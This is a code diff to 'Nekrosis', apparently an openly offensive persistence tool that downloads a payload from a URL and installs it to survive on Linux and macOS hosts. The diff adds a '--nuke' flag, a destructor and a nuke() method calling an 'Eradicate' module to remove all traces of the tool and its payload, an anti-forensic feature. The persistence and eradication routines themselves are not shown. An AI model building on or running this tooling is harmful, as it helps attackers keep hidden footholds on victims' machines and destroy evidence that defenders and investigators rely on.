@@ -22,6 +22,7 @@ from .support.linux   import LinuxPersistence
 from .support.macos   import MacPersistence
 
 from .support.export  import ExportPersistenceTypes, ExportPersistenceMethods
+from .support.nuclear import Eradicate
 
 
 SUPPORTED_HOSTS: dict = {
@@ -51,9 +52,10 @@ class Nekrosis:
         - is_admin()
     """
 
-    def __init__(self, payload: str, custom_method: str = None) -> None:
+    def __init__(self, payload: str, custom_method: str = None, nuke: bool = False) -> None:
         self._payload       = payload
         self._custom_method = custom_method
+        self._nuke          = nuke
 
         self._init_logging()
 
@@ -67,6 +69,14 @@ class Nekrosis:
 
         self._friendly_os_name = FRIENDLY_HOSTS[self._current_os]
         self._init_persistence()
+
+
+    def __del__(self) -> None:
+        """
+        Destructor for the Nekrosis class.
+        """
+        if self._nuke:
+            self.nuke()
 
 
     def _init_persistence(self) -> None:
@@ -241,7 +251,13 @@ class Nekrosis:
             recommended_method=self.recommended_persistence_method(),
             export_method=method
         ).export()
-    
+
+
+    def nuke(self) -> None:
+        """
+        Removes all traces of Nekrosis and the original payload.
+        """
+        Eradicate(self._payload).all()
 
 
 def main():
@@ -283,16 +299,23 @@ def main():
         choices=[(format.value) for format in ExportPersistenceTypes],
         help="Export the supported persistence methods to STDOUT in the specified format."
     )
+    parser.add_argument(
+        "-n",
+        "--nuke",
+        action="store_true",
+        help="Remove all traces of Nekrosis and the original payload."
+    )
+
     args = parser.parse_args()
 
     if args.payload:
             if args.payload.startswith("http://") or args.payload.startswith("https://"):
-                nekrosis = Nekrosis(payload=args.payload, custom_method=args.method)
+                nekrosis = Nekrosis(payload=args.payload, custom_method=args.method, nuke=args.nuke if args.nuke else False)
                 if nekrosis.download_payload(args.payload):
                     nekrosis.change_payload("download")
                     nekrosis.install()
             else:
-                nekrosis = Nekrosis(payload=args.payload, custom_method=args.method)
+                nekrosis = Nekrosis(payload=args.payload, custom_method=args.method, nuke=args.nuke if args.nuke else False)
 
                 if args.list_supported_methods or args.export:
                     if args.export:
@@ -302,8 +325,8 @@ def main():
                 else:
                     nekrosis.install()
     else:
-            parser.print_help()
-            sys.exit(0)
+        parser.print_help()
+        sys.exit(0)
 
 if __name__ == "__main__":
     main()
